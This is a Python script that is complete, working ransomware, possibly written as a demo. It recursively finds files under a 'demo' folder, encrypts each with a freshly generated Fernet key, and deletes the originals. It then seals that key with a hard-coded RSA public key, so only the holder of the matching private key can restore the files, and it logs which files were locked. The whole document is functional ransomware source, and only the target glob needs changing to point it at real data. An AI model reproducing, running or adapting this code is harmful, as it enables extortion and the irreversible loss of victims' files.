import os
import glob
import json
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding


ENCRYPT_GLOBS = [
    './demo/**/*.*'
]
KEY_FILE = 'secret.key'
ENCRYPTED_SUFFIX = '.enc'
LOG_FILE = 'map.log'
PUBLIC_KEY = b'''
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvX2QhfVRQ3Vc4rLsx0fW
iJY+ul2egFfZ5+dPeelxK9kPDf5Eyc6+7oTchNHmQfiF7d9YOO+pWMbeowDcVJ2U
ig3FFk1YPABjBIZT9CtyaOTZh+4tTnavn4sr9prHsHoONkBEW0WNPboIFM1dWxJK
X88/tsrFIhSzZ5lzIUhA48K2+8sxDa2qJDyQmmvVKcBOvE0SWy8wW+a+qKq0gMfP
HAK5Ja/BqivPmK1EOgZuW1ldiYmvXWBpG/MzFPOXqjLqH0RCPUEipd4cVGjvVEKU
MK+R4kjtGeUXNuDSwM55EhTuSSOuPx6NbFAsNatZtDqzX5YVmSas9VJ+C+lxlS6O
BwIDAQAB
-----END PUBLIC KEY-----
'''


def generate_key():
    '''Generate fernet synchronous key'''
    return Fernet.generate_key()


def load_public_key():
    return serialization.load_pem_public_key(PUBLIC_KEY)


def seek_files(globs):
    '''Search for files in roots with recursive globs and return list of files without duplicates.'''
    files = set()
    for g in globs:
        files |= set( glob.glob(g, recursive=True) )
    return list(files)


def encrypt_files(files, key):
    '''Encrypt the given list of files with fernet and remove the originals'''
    fernet = Fernet(key)
    encrypted = []
    for file in files:
        output = f'{file}{ENCRYPTED_SUFFIX}'
        try:
            with open(file, "rb") as f:
                data = f.read()
            data = fernet.encrypt(data)
            with open(output, "wb") as f:
                f.write(data)
            os.remove(file)
            encrypted.append({
                'in': file,
                'out': output
            })
        except Exception:
            pass
    return encrypted


def save_encrypted_key(file, sym_key):
    key = load_public_key()
    cipher = key.encrypt(
        sym_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    with open(file, 'w') as f:
        f.write(cipher.hex())


def save_encryption_logs(file, logs):
    with open(file, 'w') as f:
        json.dump(logs, f)


def main():
    # Encrypt
    key = generate_key()
    files = seek_files(ENCRYPT_GLOBS)
    encrypted = encrypt_files(files, key)

    # Write log
    save_encrypted_key(KEY_FILE, key)
    save_encryption_logs(LOG_FILE, encrypted)


## Quick tests
# print(seek_files(ENCRYPT_GLOBS))
# generate_key('secret.key')

if __name__ == '__main__':
    main()
